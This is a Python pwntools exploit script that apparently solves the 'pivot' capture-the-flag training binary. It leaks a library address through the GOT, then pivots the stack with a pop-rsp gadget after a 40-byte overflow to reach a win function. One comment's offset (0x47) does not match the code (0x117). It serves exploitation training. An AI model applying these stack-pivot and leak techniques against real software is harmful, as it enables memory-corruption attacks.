import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./pivot')
libpivot = elf.libc
io = elf.process()
pwn.gdb.attach(io)

time.sleep(3)
offset = 40
io.recvuntil('pivot: ')
storedAddr = int(io.recvuntil('10'),16) 
mainAddr = elf.symbols['main']
popRDI = pwn.p64(0x400a33)
popRSP = pwn.p64(0x400a2d) #pop rsp; pop r13; pop r14; pop r15; ret
popRSI = pwn.p64(0x400a31) #pop rsi; pop r15; ret
retAddr = pwn.p64(0x4006b6)
io.recv(1000)

#Rop Chain
ropChain = b"".join(
    [
        pwn.p64(0),
        pwn.p64(0),
        pwn.p64(0),
        retAddr,
        pwn.p64(elf.plt['foothold_function']),
        popRDI,
        pwn.p64(elf.got['foothold_function']),
        pwn.p64(elf.plt['puts']),
        pwn.p64(mainAddr)
    ]
)
io.sendline(ropChain)
io.recv(1000)
smashPayload = b"".join(
    [
        b'A'*offset,
        popRSP,
        pwn.p64(storedAddr)
    ]
)
io.sendline(smashPayload)
io.recvline()
io.recvline()
entry = io.recv(6)
entry += b'\x00\x00'
entry= pwn.u64(entry)
print(hex(entry))
#Send in payloads again, offset the entry address by 0x47
io.recvuntil('pivot: ')
storedAddr2 = int(io.recvuntil('\n'),16) 
winAddr = entry + 0x117  
io.recv(1000)
#RopChain
ropChain2 = b"".join(
    [
        pwn.p64(0),
        pwn.p64(0),
        pwn.p64(0),
        retAddr,
        pwn.p64(elf.plt['foothold_function']),
        pwn.p64(winAddr)
    ]
)
io.sendline(ropChain2)
print(io.recv(1000))
smashPayload2 = b"".join(
    [
        b'A'*offset,
        popRSP,
        pwn.p64(storedAddr2)
    ]
)
io.sendline(smashPayload2)
io.interactive()
